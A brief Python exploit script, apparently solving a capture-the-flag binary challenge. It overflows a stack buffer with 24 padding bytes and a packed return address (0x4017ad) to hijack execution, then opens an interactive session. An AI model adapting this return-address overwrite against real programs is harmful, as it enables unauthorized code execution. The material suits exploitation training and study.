import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('------------- /!\ NEW STACKFRAME ALLOCATED /!\ -------------'))
infoleak_line = p.readline()
print(infoleak_line)
p.sendline('A'*24 + p64(0x4017ad))

p.interactive()
